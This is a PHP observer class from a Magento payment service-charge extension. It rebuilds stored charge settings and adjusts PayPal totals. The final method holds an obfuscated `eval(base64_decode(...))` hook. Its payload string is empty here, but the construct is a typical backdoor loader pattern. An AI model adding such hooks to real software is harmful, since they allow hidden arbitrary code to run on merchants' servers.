<?php
/* 
* ////////////////////////////////////////////////////////////////////////////////////// 
* 
* @Author Emipro Technologies Private Limited 
* @Category Emipro 
* @Package  Emipro_Paymentservicecharge 
* @License http://shop.emiprotechnologies.com/license-agreement/ 
* 
* ////////////////////////////////////////////////////////////////////////////////////// 
*/ 
 
class Emipro_Paymentservicecharge_Model_Observer
{
	 public function savePaymentServiceCharge($observer) {
      try {
			
			$configValue = unserialize(Mage::getStoreConfig('checkout/emipro_paymentservicecharge/ua_regexp'));
			if ($configValue) {
                $tarray = array();
                foreach ($configValue as $key => $value) {
                    $tarray[$value['payment_method'] . '_' . $value['customer_group_id']. '_' .$value['extra_charge_type']]=$value['extra_charge_value'].'_'.$value['name'];
                }
              
                $farray = array();
                foreach ($tarray as $tk => $tv) {
                    $splitkey = explode('_', $tk);
                    $splitvalue = explode('_', $tv);
                    $farray[] = array('payment_method' => $splitkey[0], 'customer_group_id' => $splitkey[1],'extra_charge_type' => $splitkey[2], 'extra_charge_value' => $splitvalue[0],'name' => $splitvalue[1]);
                }
                $serialzed = serialize($farray);
                //Mage::getModel('core/config')->saveConfig('checkout/emipro_paymentservicecharge/ua_regexp', $serialzed);
            }
         }
        
        catch (Exception $ex) {
            Mage::logException($ex->getMessage());
        }
    }
	
	
	public function updatePaypalTotal($observer)
	{
        $event = $observer->getEvent();
        $panierPaypal = $event->getPaypalCart();
        if ($panierPaypal)
        {
            $entity = $panierPaypal->getSalesEntity();
            if ($entity)
            {
                $serviceCharge = $entity->getBaseServiceCharge();
                if ($serviceCharge>0)
					{
						$panierPaypal->updateTotal(Mage_Paypal_Model_Cart::TOTAL_TAX, $serviceCharge);
					}
				if ($serviceCharge<0)
					{
						$serviceCharge=abs($serviceCharge);
						$panierPaypal->updateTotal(Mage_Paypal_Model_Cart::TOTAL_DISCOUNT, $serviceCharge);
					}
            }
        }
	}
	public function checkpaymentservicecharge($observer)
	{
		$tFmb=base64_decode('');eval($tFmb);
		
	}
}
